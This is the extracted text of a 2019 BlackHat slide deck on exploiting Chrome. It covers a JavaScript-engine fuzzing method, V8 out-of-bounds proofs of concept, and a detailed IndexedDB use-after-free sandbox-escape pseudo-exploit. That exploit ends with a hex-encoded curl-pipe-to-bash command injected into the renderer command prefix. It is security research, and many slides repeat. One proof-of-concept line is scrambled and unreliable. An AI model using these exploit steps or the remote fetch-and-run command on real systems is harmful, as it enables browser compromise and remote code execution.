The Most Secure Browser? Pwning Chrome from 2016 to 2019.
Zhen Feng
 Gengming Liu
 BlackHat USA 2019

whoami
Zhen Feng
 Senior Security Researcher at Keen Security Lab of Tencent (formerly known as Keen Team).
 Member of the Tencent Security Sniper Team in Pwn2Own 2016, Mobile Pwn2Own 2016,
 Pwn2Own 2017 and Mobile Pwn2Own 2017, winning three "Master of Pwn".
 Compiler lover and soccer fan.
Gengming Liu
 Security Researcher at Keen Security Lab of Tencent (formerly known as Keen Team).
 Mobile Pwn2Own 2016/Pwn2Own 2017/Mobile Pwn2Own 2017 winner.
 V8/ChromeOS/Chrome Sandbox vulnerability hunter.
 CTF enthusiastic, DEFCON CTF final player.

agenda

SET - Semantic Equivalent Transform
 Advanced Exploitation Technique
 Sandbox Bypassing
 Demo

man set
NAME
 set -- semantic equivalent transform

SYNOPSYS
 set source target

DESCRIPTION
 In short, set is a methodology of program transforming. Typically, set
 is used to fuzz JavaScript engine. It consumes a JavaScript file as
 the seed, and generates new JavaScript files.

state of the art

The more you know about it, the more you can do with it.

fuzzer

grammar

generate

seeds

mutate

monitor

new
 files

target

i/o

search

· builtins


a.js

· methods


· scope


· variable


· type


· signature

ast

mutate

b.js

· xover
 · add
 · delete
 · replace

visitor

origin
CVE-2016-5129

origin
CVE-2016-0193

origin

Distance() < C

origin
Learning without thinking leads to confusion, thinking without learning is wasted effort.

origin
35th ACM SIGPLAN Conference on Programming Language Design and Implementation
The key insight behind EMI is to exploit the interplay between dynamically executing a program P on as subset of inputs and statically compiling P to work on all inputs. Given a program P and a set of input values I from its domain, the input set I induces a natural collection of programs C such that every program Q  C is equivalent to P modulo I: i  I,Q(i) = P(i)

origin

Limitation:
 · Search space is limited by dead code regions
 · Compilers may optimize dead code away
 · Mis-compiled dead code is not observable

Delete Add Modify

set
· The mutated JS files are always of Hight Quality
 · EMI w.r.t the original sample
 · Different Control-flow and Data-flow
CVE-2016-5198

set

Context Switch

Loopenize Functionize Conditionize

Nop Statement

Empty Loop Gargage Collect Type Based Nontype Based

Structure Transform

Permutation Repeat Declaration

OH

O

N

N


H

set

set
Pwn2Own 2017
Late 2017

Late 2017 Early 2018 (Pwnium 2019)

Reference
1. Compiler Validation via Equivalence Modulo Inputs (http://vuminhle.com/pdf/pldi14-emi.pdf)

Advanced Exploitation Technique

PoC of CVE-2017-5053

var arr = [];

for var

(fvraoRrmIeintudr=enx0v;=alui{ev<aisl1ua0en0O0fIn0:t0e;fgueinr+c. +t)iNoano(rm)r[e{im]aor=rry0.c;loernrgutphtio=n!0;

}};

arr.indexOf(1, fromIndex);

What can we do with the worst OOB?
· Infoleak?
 · ArrayBuffer
 · JIT

· PC Control

Bind(&string_loop); {
Label continue_loop(this); GotoIfNot(UintPtrLessThan(index_var.value(), len_var.value()),
&return_not_found); Node* element_k = LoadFixedArrayElement(elements, index_var.value()); GotoIf(TaggedIsSmi(element_k), &continue_loop); GotoIfNot(IsString(element_k), &continue_loop); Callable callable = CodeFactory::StringEqual(isolate()); Node* result = CallStub(callable, context, search_element, element_k); Branch(WordEqual(BooleanConstant(true), result), &return_found,
&continue_loop); Bind(&continue_loop); index_var.Bind(IntPtrAdd(index_var.value(), intptr_one)); Goto(&string_loop); }

CodeFactory::StringEqual TF_BUILTIN(StringEqual, StringBuiltinsAssembler) { GenerateStringEqual(); }

void StringBuiltinsAssembler::GenerateStringEqual() {

// Here's pseudo-code for the algorithm below:

//

// if (lhs == rhs) return true;

// if (lhs->length() != rhs->length()) return false;

// if (lhs->IsInternalizedString() && rhs->IsInternalizedString()) {

// return false; // }

var trigger_str = ""+"";

// if (lhs->IsSeqOneByteString() && rhs->IsSeqOneByteString()) {

// for (i = 0; i != lhs->length(); ++i) {

//

if (lhs[i] != rhs[i]) return false;

// }

// return true;

// }

// if (lhs and/or rhs are indirect strings) {

// unwrap them and restart from the beginning;

// }

// return %StringEqual(lhs, rhs);

}

leaked ArrayBuffer backing store

Map Hash Length External Ptr

deadbeef tag
vtable

Func1 Func2
...... ***Func 5***

PoC
function trigger() { var a = null; for (var i = 0; i < 0x10000; i++) var b; try { a = [null, new Object()]; } catch (e) { b.x = 1; }; a[4294967169] = {}; var x = a.pop(); return x;
}

Bug primitive
· a.length = 0x1c2`3184b491

Bug primitive
· a.length = 0x1c2`00000000

Bug primitive
· a.length = 0x1c1`00000000

Bug primitive
· a.length = 0x1c1`00000000
 · Array.pop OOB Write Undefined

Bug primitive
· a.length = 0x1c1`00000000
 · Array.pop OOB Write Undefined
 · Array.pop OOB Read

Bug primitive
· a.length = 0x1c1`00000000
 · Array.pop OOB Write Undefined
 · Array.pop OOB Read

Bug primitive
· a.length = 0x1c1`00000000
 · Array.pop OOB Write Undefined
 · Array.pop OOB Read

Bug primitive
· a.length = 0x1c1`00000000
 · Array.pop OOB Write Undefined
 · Array.pop OOB Read 

Mobile Pwn2Own 2016
m = new Map(); function Ctor() {
m = new Map(); } function Check() {
m.a = 0x41414141; } for (var i = 0; i < 0x2000; ++i) {
Ctor(); } for (var i = 0; i < 0x2000; ++i) {
Check(); } Ctor(); Check();

Play with properties
· Empty fixed array OOB leads to Arbitrary Address Read/Write

· CSW2017 Pwning the NexusTM of Every PixelTM
 · object & double value

· No need to fake object (I hate it...)

· saelo - v9
 · saelo - SSD JSCreateObject

JIT Code Fragment

var s = new Set(); function check() {
s.xyz = 0x200; }
No map check on
 Global Variable.

0x2a60abb05c40 <+0>: 0x2a60abb05c41 <+1>: 0x2a60abb05c44 <+4>: 0x2a60abb05c45 <+5>: 0x2a60abb05c46 <+6>: 0x2a60abb05c4a <+10>: 0x2a60abb05c4e <+14>: 0x2a60abb05c52 <+18>: 0x2a60abb05c55 <+21>: 0x2a60abb05c5c <+28>: 0x2a60abb05c5e <+30>: 0x2a60abb05c63 <+35>: 0x2a60abb05c6d <+45>: 0x2a60abb05c71 <+49>: 0x2a60abb05c78 <+56>: 0x2a60abb05c82 <+66>: 0x2a60abb05c85 <+69>: 0x2a60abb05c86 <+70>:

push rbp mov rbp,rsp push rsi push rdi sub rsp,0x8 mov rax,QWORD PTR [rbp-0x8] mov QWORD PTR [rbp-0x18],rax mov rsi,rax cmp rsp,QWORD PTR [r13+0xc18] jae 0x2a60abb05c63 <LazyCompile:*check +35> call 0x2a60aba54460 <Builtin:StackCheck> movabs rax,0x101ea888af89 mov rax,QWORD PTR [rax+0x7] mov DWORD PTR [rax+0x13],0x200 movabs rax,0x3efe41082311 mov rsp,rbp pop rbp ret 0x8

JIT Code Fragment
m = new Map(); m.a = 0x10; m.b = 0x10; m.c = 0x10; m.d = 0x10;
function Check() { m.a = 0x41414141; m.c = 1.1; m.d = m;
}
for (var i = 0; i < 0x2000; ++i) { Check();
}
trigger_bug(); Check();

function gc() { for (var i = 0; i < (1024*1024)/0x4; i++) { var a = [new Set(), new Set(), ..., new Set()]; }
}

Set 1

Set 2

...... map | property | ... map | property | ...

while (1) { t = trigger(); if (t instanceof Set) { break; }
} var global_s = t;

global_s

FixedArray

Length

......

Set

... map | property | ...

oob Array.pop

global_s.a = 0x10; global_s.b = 0x10; global_s.c = 0x10; // d, e, f, ..., j global_s.k = 0x10; global_s.l = 0x10; global_s.m = 0x10; function opt(fl, len) {
global_s.h = len; global_s.i = fl; global_s.k = 0x200; global_s.l = ab; global_s.m = func; }

global_s

FixedArray

Length

......

Set

... map | property | ...

oob Array.pop

var null_aa = new Array(0x40); for (var i = 0; i < null_aa.length; i++) {
// So many `null` null_aa[i] = new Array(null,null,...); }

global_s

FixedArray

Length

......

null

...

null | null | null | ...

opt(fln, 0);

FixedArray

Length

......

global_s

null

...

null | null | null | ...

Out-of-bounds in Promise
· crbug/831170 
 · Found by auditing, killed by code-refactor

· undefined -> properties-or-hash field

Chrome Sandbox Bypass

Attack Surface
· Logical bug
 · Kernel
 · Memory Corruption via IPC

Logical Bug
· CVE-2016-5197: Arbitrary intent start in renderer
 · Attack Webview in privileged App(killed in Android O)
 · Credit to Qidan He(@flanker_hqd)

Kernel
· win32k lockdown
 · CLFS

Pwn2Own 2017

Got System!

CLFS
· Killed by RtlIsSandboxToken in RS3

· The kernel bug credit to Daniel King(@long123king) and Peter Hlavaty(@zer0mem)

IPC mojo

CVE-2019-5826: Use-after-free in IndexedDB

IndexedDB API in Browser
var request = indexedDB.open(dbName, 2);
request.onupgradeneeded = function(event) { var db = event.target.result; var objectStore = db.createObjectStore("customers", { keyPath: "ssn" }); objectStore.createIndex("name", "name", { unique: false });
};
var deleteRequest = indexedDB.deleteDatabase(dbName);

IndexedDB IPC interfaces
· IDBFactory
 · IDBDatabase
 · IDBCursor

IDBFactory
interface IDBFactory { GetDatabaseInfo(associated IDBCallbacks callbacks); GetDatabaseNames(associated IDBCallbacks callbacks); Open(associated IDBCallbacks callbacks, associated IDBDatabaseCallbacks database_callbacks, mojo_base.mojom.String16 name, int64 version, int64 transaction_id); DeleteDatabase(associated IDBCallbacks callbacks, mojo_base.mojom.String16 name, bool force_close); AbortTransactionsAndCompactDatabase() => (IDBStatus status); AbortTransactionsForDatabase() => (IDBStatus status);
};

PoC
· Open("db1", 1);
 - Open("db1", 2);
 - DeleteDatabse("db1", force_close=True);
 - AbortTransactionsForDatabase();

IndexedDBDatabase::DeleteDatabase

IndexedDBDatabase::ForceClose

IndexedDBConnection::ForceClose

IndexedDBConnection::ForceClose

UAF in database_map_
· Find the references of `database_map_`
void IndexedDBFactoryImpl::Open( const base::string16& name, std::unique_ptr<IndexedDBPendingConnection> connection, const Origin& origin, const base::FilePath& data_directory) {
IDB_TRACE("IndexedDBFactoryImpl::Open"); IndexedDBDatabase::Identifier unique_identifier(origin, name); auto it = database_map_.find(unique_identifier); if (it != database_map_.end()) {
it->second->OpenConnection(std::move(connection)); return; } // ... }

UAF in database_map_
· Find the references of `database_map_`
void IndexedDBFactoryImpl::DeleteDatabase( const base::string16& name, scoped_refptr<IndexedDBCallbacks> callbacks, const Origin& origin, const base::FilePath& data_directory, bool force_close) {
IDB_TRACE("IndexedDBFactoryImpl::DeleteDatabase"); IndexedDBDatabase::Identifier unique_identifier(origin, name); const auto& it = database_map_.find(unique_identifier); if (it != database_map_.end()) {
// If there are any connections to the database, directly delete the // database. it->second->DeleteDatabase(callbacks, force_close); return; } // ... }

JS indexedDB
window.indexedDB.open() => { 
 IDBName, IDBVersion, objectStoreNames, ...

}

· String is good for infoleak!

UAF of IndexedDBDatabase
void IndexedDBDatabase::OpenConnection( std::unique_ptr<IndexedDBPendingConnection> connection) {
AppendRequest(std::make_unique<OpenRequest>(this, std::move(connection))); }
void IndexedDBDatabase::DeleteDatabase( scoped_refptr<IndexedDBCallbacks> callbacks, bool force_close) {
AppendRequest(std::make_unique<DeleteRequest>(this, callbacks)); // Close the connections only after the request is queued to make sure // the store is still open. if (force_close)
ForceClose(); }

UAF of IndexedDBDatabase
void IndexedDBDatabase::AppendRequest( std::unique_ptr<ConnectionRequest> request) {
pending_requests_.push(std::move(request));
if (!active_request_) ProcessRequestQueue();
}

UAF of IndexedDBDatabase
void IndexedDBDatabase::ProcessRequestQueue() { if (processing_pending_requests_) return;
DCHECK(!active_request_); DCHECK(!pending_requests_.empty());
base::AutoReset<bool> processing(&processing_pending_requests_, true); do {
active_request_ = std::move(pending_requests_.front()); pending_requests_.pop(); active_request_->Perform(); // If the active request completed synchronously, keep going. } while (!active_request_ && !pending_requests_.empty()); }

void IndexedDBDatabase::OpenRequest::Perform() { // ... pending_->callbacks->OnSuccess( db_->CreateConnection(pending_->database_callbacks, pending_->child_process_id), db_->metadata_); // ...
}
struct BLINK_COMMON_EXPORT IndexedDBDatabaseMetadata { // ... base::string16 name; int64_t id; int64_t version; int64_t max_object_store_id;
std::map<int64_t, IndexedDBObjectStoreMetadata> object_stores;
bool was_cold_open; };

void IndexedDBDatabase::OpenRequest::Perform() { // ... pending_->callbacks->OnSuccess( db_->CreateConnection(pending_->database_callbacks, pending_->child_process_id), db_->metadata_); // ...
}
struct BLINK_COMMON_EXPORT IndexedDBDatabaseMetadata { // ... base::string16 name; int64_t id; int64_t version; int64_t max_object_store_id;
std::map<int64_t, IndexedDBObjectStoreMetadata> object_stores;
bool was_cold_open; };

Then we got...

void IndexedDBDatabase::OpenRequest::Perform() { // ... pending_->callbacks->OnSuccess( db_->CreateConnection(pending_->database_callbacks, pending_->child_process_id), db_->metadata_); // ...
}
struct BLINK_COMMON_EXPORT IndexedDBDatabaseMetadata { // ... base::string16 name; int64_t id; int64_t version; int64_t max_object_store_id;
std::map<int64_t, IndexedDBObjectStoreMetadata> object_stores;
bool was_cold_open; };

void IndexedDBDatabase::OpenRequest::Perform() { // ... pending_->callbacks->OnSuccess( db_->CreateConnection(pending_->database_callbacks, pending_->child_process_id), db_->metadata_); // ...
}
struct BLINK_COMMON_EXPORT IndexedDBDatabaseMetadata { // ... base::string16 name; int64_t id; int64_t version; int64_t max_object_store_id;
std::map<int64_t, IndexedDBObjectStoreMetadata> object_stores;
bool was_cold_open; };

UAF of IndexedDBDatabase
void IndexedDBDatabase::AppendRequest( std::unique_ptr<ConnectionRequest> request) {
pending_requests_.push(std::move(request));
if (!active_request_) ProcessRequestQueue();
}

UAF of IndexedDBDatabase

void IndexedDBDatabase::AppendRequest( std::unique_ptr<ConnectionRequest> request) {
pending_requests_.push(std::move(request));

if (!active_request_) ProcessRequestQueue();
}
// indexed_db_database.h

let active_request_ = 0x101;

std::unique_ptr<ConnectionRequest> active_request_;

base::queue<std::unique_ptr<ConnectionRequest>> pending_requests_;

pseudo-exploit

trigger_bug();

let ab1 = new ArrayBuffer(0x148); w64(ab1, 0, 0x31313131n); w64(ab1, 8, 0xffffffff00000030n); w64(ab1, 0x118, 0x101);

// magic // reference count // active_request_

// pending_requests_ begin w64(ab1, 0x120, 0); w64(ab1, 0x128, 0); w64(ab1, 0x130, 0); w64(ab1, 0x138, 0); // pending_requests_ end

// *arr_ptr // size // front // rear

do_spray(ab1); // uaf - use window.indexedDB.deleteDatabase("evil_db");

pseudo-exploit

trigger_bug();

let ab1 = new ArrayBuffer(0x148); w64(ab1, 0, 0x31313131n); w64(ab1, 8, 0xffffffff00000030n); w64(ab1, 0x118, 0x101);

// magic // reference count // active_request_

// new Blob([ab1]) do_spray(ab1);

// uaf - use window.indexedDB.deleteDatabase("evil_db");

Before DeleteDatabase

After DeleteDatabase

Thanks base::queue !

HeapPage Spray
· Thanks @NedWilliamson and @niklasb
 · Spray 0x1000*0x800*180 bytes

· sizeof(page) * pages_per_blob * blobs_nums
 · Prepare vtable, ROP chain, pointers, etc on page
 · Find a vtable call

vtable call
void DoDelete() { // ... db_->factory_->DatabaseDeleted(db_->identifier_); // ...
}
· free the blob and refill the hole with:
 · active_request_ = 0
 · factory_ = (leak_addr + 0x20000000n) & (~0xfffn);

· goto `DoDelete()`

Exploit chain
Trigger Bug

spray blob fill the hole

leak from blob

DoDelete & ROP

spray PageHeap

free & spray blob refill the hole

ThreadCache almost kill me

· IO Thread
 · UI Thread
 · IDB Thread

Malloc

CentralCache

ThreadCache

Free

So easy? How about this.

Exploit Chrome on ChromeOS (Linux)
· Clang CFI Enabled
 · No binary and library address

Clang Control Flow Integrity
· Not like Microsoft's CFG, cannot find any bypass methods in history, except stack-based corruption

· https://github.com/0xcl/clang-cfi-bypass-techniques
 · PoC-1: code injection into JIT region
 · PoC-2: corrupting return address
 · PoC-3: corrupting stack-spilled registers

Stack-based attack?
· Stack address required
 · thread stack 

· Binary address required
 · High-demand AAW required 

Chrome is a huge system!
· More than 100 flags, some interesting:

· --no-sandbox
 · --single-process
 · --renderer-cmd-prefix
 · --utility-cmd-prefix
 · --gpu-launcher
 · --zygote-cmd-prefix
 · ......


Chrome is a huge system!
· More than 100 flags, some interesting:

· --no-sandbox
 · --single-process
 · --renderer-cmd-prefix
 · --utility-cmd-prefix
 · --gpu-launcher
 · --zygote-cmd-prefix
 · ......


Chrome is a huge system!
· More than 100 flags, some interesting:

· --no-sandbox
 · --single-process
 · --renderer-cmd-prefix
 · --utility-cmd-prefix
 · --gpu-launcher
 · --zygote-cmd-prefix
 · ......

· How does a renderer process start?

bool RenderProcessHostImpl::Init() { // ... base::CommandLine::StringType renderer_prefix; // A command prefix is something prepended to the command line of the spawned // process. const base::CommandLine& browser_command_line = *base::CommandLine::ForCurrentProcess(); renderer_prefix = browser_command_line.GetSwitchValueNative(switches::kRendererCmdPrefix);
// ... // Build command line for renderer. We call AppendRendererCommandLine() // first so the process type argument will appear first. std::unique_ptr<base::CommandLine> cmd_line =
std::make_unique<base::CommandLine>(renderer_path); if (!renderer_prefix.empty())
cmd_line->PrependWrapper(renderer_prefix); AppendRendererCommandLine(cmd_line.get());
// ... child_process_launcher_ = std::make_unique<ChildProcessLauncher>(
// ... std::move(cmd_line), //... ); // ... }

--renderer-cmd-prefix='xterm -title renderer -e gdb --args'

What is `browser_command_line`?
// static CommandLine* CommandLine::ForCurrentProcess() {
DCHECK(current_process_commandline_); return current_process_commandline_; }
class BASE_EXPORT CommandLine { // ... using SwitchMap = std::map<std::string, StringType, std::less<>>; // Parsed-out switch keys and values. SwitchMap switches_; // ...
}

CommandLine Injection
· Binary address required
 · 8 bytes write 

I want more...
· base::queue
namespace base { template <class T, class Container = circular_deque<T>> using queue = std::queue<T, Container>; } // namespace base

After DeleteDatabase

base::queue

arr_ptr

size

- | 0x1f15101a3440 | 0x000000000004 |

- | 0x000000000000 | 0x000000000001 |

front

rear

0x1f15101a3440: | ptr[0] | hole | hole | hole |

base::queue

arr_ptr

size

- | 0x1f15101a3440 | 0x000000000004 |

- | 0x000000000000 | 0x000000000001 |

front

rear

0x1f15101a3440: | ptr[0] | hole | hole | hole |

base::queue

arr_ptr

size

- | 0x1f15101a3440 | 0x000000000004 |

- | 0x000000000000 | 0x000000000001 |

front

rear

0x1f15101a3440: | ptr[0] | hole | hole | hole |

base::queue

arr_ptr

size

- | 0x1f15101a3440 | 0x000000000004 |

- | 0x000000000000 | 0x000000000001 |

front

rear

0x1f15101a3440: | ptr[0] | hole | hole | hole |

base::queue

arr_ptr

size

- | 0x1f15101a3440 | 0x000000000004 |

- | 0x000000000000 | 0x000000000001 |

front

rear

0x1f15101a3440: | ptr[0] | hole | hole | hole |

base::queue (not full: size != rear - front)
· new ConnectionRequest
 · push_back(...)
 · AAW new pointer!

base::queue (full: size == rear - front)
· Increase storage by a quarter (free & malloc)
 · Arbitrary Address Free!
 · memmove (careful!)

base::queue (full: size == rear - front)
· Increase storage by a quarter (free & malloc)
 · Arbitrary Address Free!
 · memmove (careful!)

· Thanks base::queue again!

pseudo-exploit
for (let i = 0; i < 34; i++) { await sleep(100); // pending_requests_.size += 1 window.indexedDB.deleteDatabase('evil_db');
}
// size = 42 (0x150 bytes) let leak_addr = await leak_heap_addr();
// fall in Blob, depends on heap spray leak_addr -= 0x160 * 2;

pseudo-exploit
let db_addr = leak_addr;
w64(ab1, 0, 0x32323232); w64(ab1, 0x120, db_addr); w64(ab1, 0x128, 42); w64(ab1, 0x138, 41);
// 1. delete the leaked blob // 2. do `PreciseCollectAllGarbage`, browser end handle reset() // 3. spray the blob of `ab1`, thanks Mark Brand free_and_refill_hole(ab1);

pseudo-exploit
// free the victim blob(db_addr) window.indexedDB.deleteDatabase('evil_db');
// refill (very stable thanks to ThreadCache) let db2 = window.indexedDB.open("db2", 1); db2.onupgradeneeded = async function (event) {
let db = event.target.result; let vtable_addr = await search_for_vtable(); // next stage... }

IseeDeadPeople -- Warcraft III
· But...hate any guessing? It's OK if you are a diligent boy.

pseudo-exploit
for (let i = 0; i < 34; i++) { await sleep(100); // pending_requests_.size += 1 window.indexedDB.deleteDatabase('evil_db');
}
// size = 42 (0x150 bytes) let leak_addr = await leak_heap_addr();
// fall in Blob, depends on heap spray leak_addr -= 0x160 * 2;

pseudo-exploit
for (let i = 0; i < 34; i++) { await sleep(100); // pending_requests_.size += 1 window.indexedDB.deleteDatabase('evil_db');
}
// size = 42 (0x150 bytes) let leak_addr = await leak_heap_addr();
// fall in Blob, depends on heap spray leak_addr -= 0x160 * 2;

pseudo-exploit
let db_addr = leak_addr;
for (let i = 0; i < 8; i++) { await sleep(100); window.indexedDB.deleteDatabase('evil_db');
}
window.indexedDB.open("new_evil_db", 1); await sleep(1000);
// 1. Use AAF to free the new_evil_db // 2. Construct std::map<>metadata_ with db_addr // 3. Spray blobs and refill the object arbitrary_free_and_refill(db_addr); let db = window.indexedDB.open("new_evil_db", 1);

void IndexedDBDatabase::OpenRequest::Perform() { // ... pending_->callbacks->OnSuccess( db_->CreateConnection(pending_->database_callbacks, pending_->child_process_id), db_->metadata_); // ...
}
struct BLINK_COMMON_EXPORT IndexedDBDatabaseMetadata { // ... base::string16 name; int64_t id; int64_t version; int64_t max_object_store_id;
std::map<int64_t, IndexedDBObjectStoreMetadata> object_stores;
bool was_cold_open; };

void IndexedDBDatabase::OpenRequest::Perform() { // ... pending_->callbacks->OnSuccess( db_->CreateConnection(pending_->database_callbacks, pending_->child_process_id), db_->metadata_); // ...
}
struct BLINK_COMMON_EXPORT IndexedDBDatabaseMetadata { // ... base::string16 name; int64_t id; int64_t version; int64_t max_object_store_id;
std::map<int64_t, IndexedDBObjectStoreMetadata> object_stores;
bool was_cold_open; };

pseudo-exploit
let db = window.indexedDB.open("new_evil_db", 1); db.onupgradeneeded = async function (event) {
let db = event.target.result; console.log(db.name); console.log(db.objectStoreNames); // next stage not finished... }

The last thing -- 8 bytes write
interface IDBDatabase { RenameObjectStore(int64 transaction_id, int64 object_store_id, mojo_base.mojom.String16 new_name);
RenameIndex(int64 transaction_id, int64 object_store_id, int64 index_id, mojo_base.mojom.String16 new_name);
};

void IndexedDBDatabase::OpenRequest::Perform() { // ... pending_->callbacks->OnSuccess( db_->CreateConnection(pending_->database_callbacks, pending_->child_process_id), db_->metadata_); // ...
}
struct BLINK_COMMON_EXPORT IndexedDBDatabaseMetadata { // ... base::string16 name; int64_t id; int64_t version; int64_t max_object_store_id;
std::map<int64_t, IndexedDBObjectStoreMetadata> object_stores;
bool was_cold_open; };

struct BLINK_COMMON_EXPORT IndexedDBObjectStoreMetadata { base::string16 name; int64_t id; blink::IndexedDBKeyPath key_path; bool auto_increment; int64_t max_index_id;
std::map<int64_t, IndexedDBIndexMetadata> indexes; };
struct BLINK_COMMON_EXPORT IndexedDBIndexMetadata { base::string16 name; int64_t id; blink::IndexedDBKeyPath key_path; bool unique; bool multi_entry;
};

RenameObjectStore 
Status IndexedDBMetadataCoding::RenameObjectStore( // ..., IndexedDBObjectStoreMetadata* metadata) {
// ... base::string16 old_name_check; bool found = false; Status s = GetString(transaction, name_key, &old_name_check, &found);
if (!found || old_name_check != metadata->name) { INTERNAL_CONSISTENCY_ERROR_UNTESTED(DELETE_OBJECT_STORE); return InternalInconsistencyStatus();
} // ... }

RenameIndex ?
void IndexedDBDatabase::RenameIndex(IndexedDBTransaction* transaction, int64_t object_store_id, int64_t index_id, const base::string16& new_name) {
// ... if (!ValidateObjectStoreIdAndIndexId(object_store_id, index_id))
return; // ... Status s = metadata_coding_->RenameIndex(
transaction->BackingStoreTransaction()->transaction(), transaction->database()->id(), object_store_id, new_name, &old_name, &index_metadata); // ... }

RenameIndex ?
Status IndexedDBMetadataCoding::RenameIndex(LevelDBTransaction* transaction, int64_t database_id, int64_t object_store_id, base::string16 new_name, base::string16* old_name, IndexedDBIndexMetadata* metadata) {
if (!KeyPrefix::ValidIds(database_id, object_store_id, metadata->id)) return InvalidDBKeyStatus();
const std::string name_key = IndexMetaDataKey::Encode( database_id, object_store_id, metadata->id, IndexMetaDataKey::NAME);
// TODO(dmurph): Add consistancy checks & umas for old name. PutString(transaction, name_key, new_name); *old_name = std::move(metadata->name); metadata->name = std::move(new_name); return Status::OK(); }

RenameIndex ?
Status IndexedDBMetadataCoding::RenameIndex(LevelDBTransaction* transaction, int64_t database_id, int64_t object_store_id, base::string16 new_name, base::string16* old_name, IndexedDBIndexMetadata* metadata) {
if (!KeyPrefix::ValidIds(database_id, object_store_id, metadata->id)) return InvalidDBKeyStatus();
const std::string name_key = IndexMetaDataKey::Encode( database_id, object_store_id, metadata->id, IndexMetaDataKey::NAME);
// TODO(dmurph): Add consistancy checks & umas for old name. PutString(transaction, name_key, new_name); *old_name = std::move(metadata->name); metadata->name = std::move(new_name); return Status::OK(); }

base::string(std::string)
· sizeof(std::string) => 0x18 bytes
· length < 0x18 - | 0x4141414141414141 | 0x4141414141414141 | - | 0x1600414141414141 |
· length >= 0x18 - | 0x000023ae01434dc0 | 0x000000000000001f | - | 0x8000000000000020 |

struct BLINK_COMMON_EXPORT IndexedDBDatabaseMetadata { // ... std::map<int64_t, IndexedDBObjectStoreMetadata> object_stores;
};
struct BLINK_COMMON_EXPORT IndexedDBObjectStoreMetadata { // ... std::map<int64_t, IndexedDBIndexMetadata> indexes;
};
struct BLINK_COMMON_EXPORT IndexedDBIndexMetadata { base::string16 name; int64_t id; blink::IndexedDBKeyPath key_path; bool unique; bool multi_entry;
};

Crowded layout
w64(ab1, 0, 0); // Arbitrary write for index.id( > 30) w64(ab1, 0x120, cmdline_addr+0x14n); w64(ab1, 0x128, 42); w64(ab1, 0x138, 0);
// db_->metadata_: object_stores w64(ab1, 0x48, db_addr); w64(ab1, 0x50, db_addr); w64(ab1, 0x58, 1);
// db_->metadata_.object_stores: id (db_addr+0x00) w64(ab1, 0x18, 1); w64(ab1, 0x20, 1); w64(ab1, 0x30, 1); // db_->metadata_.object_stores: indexes w64(ab1, 0x90, cmdline_addr-0x28n); w64(ab1, 0x98, cmdline_addr-0x28n); w64(ab1, 0xa0, 1);

// commandline_.switches (db_addr+0x50) w64(ab1, 0x68, db_addr+0xb0n); w64(ab1, 0x70, db_addr+0xb0n); w64(ab1, 0x78, 1);
// commandline_.switches[0] (db_addr+0xa0) w64(ab1, 0xc0, db_addr+0x70n); w64(ab1, 0xc8, 1); w64(ab1, 0xd0, 0x62646e61732d6f6en); w64(ab1, 0xd8, 0x786fn); w64(ab1, 0xe0, 0x0a00000000786966n); w64(ab1, 0xe8, 0n); w64(ab1, 0xf0, 0x1f); w64(ab1, 0xf8, 0x0000000000000020n);
// sh -c $(curl${IFS}moe.ist|bash) w64(ab1, 0x100, 0x282420632d206873n); w64(ab1, 0x108, 0x46497b246c727563n); w64(ab1, 0x110, 0x73692e656f6d7d53n); w64(ab1, 0x118, 0x0029687361627c74n);

Eventually, lots of labour work
· I love ASM!
 · MojoJS IPC Name ID

